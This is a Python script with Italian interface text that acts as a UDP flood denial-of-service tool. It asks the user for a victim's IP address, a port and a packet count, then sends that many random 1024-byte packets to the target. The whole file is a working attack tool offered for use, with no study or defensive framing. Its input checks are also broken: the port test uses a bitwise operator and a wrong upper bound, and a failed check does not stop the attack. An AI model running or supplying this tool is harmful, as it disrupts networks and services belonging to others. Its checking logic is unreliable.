import socket
import random
import ipaddress

def udp_dos(ip_vittima, porta_udp, numero_pacchetti):
     try:     
         udp_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
         dati_pacchetto = bytearray(random.getrandbits(8) for _ in range(1024))
         
         print("\nAttacco DoS in corso verso " + ip_vittima + ":" + str(porta_udp) + "...")
         
         for _ in range(numero_pacchetti):             
             udp_socket.sendto(dati_pacchetto, (ip_vittima, porta_udp))
     except Exception as error:
            print("Si è verificato un errore durante l'attacco DoS: ", error)
     finally:
         if udp_socket:
             print("Attacco DoS terminato.")
             udp_socket.close()

print("************************")
print("Attacco DoS tramite UDP")
print("************************")

try:
    ip_vittima = input("\nInserisci l'IP della vittima: ")
    porta_udp = int(input("Inserisci la porta UDP della vittima (1-65535): "))
    numero_pacchetti = int(input("Inserisci il numero di pacchetti da inviare: "))
    
    print("\n**********************")
    print("Verifica dell'input...")
    print("**********************")
    
    try:
        ipaddress.ip_address(ip_vittima)
        print("\nL'indirizzo IP è valido.")
    except ValueError:
        print("\nL'indirizzo IP non è valido.")
    
    if porta_udp >= 1 & porta_udp <= 655355:
        print("La porta inserita è valida.")
    else:
        print("La porta inserita non è valida.")
        
    if numero_pacchetti < 1:
        print("Il numero di pacchetti è inferiore a 1.")
    else:
        print("Il numero di pacchetti è valido.")
    
    inizio_dos = input("\nVuoi far partire l'attacco? [y/n]: ")
    
    if inizio_dos == "y":
        udp_dos(ip_vittima, porta_udp, numero_pacchetti)
          
    elif inizio_dos == "n":
        print("\nL'attacco è stato annullato.")
   
except Exception as error:
     print("\nL'input non è valido: ", error)
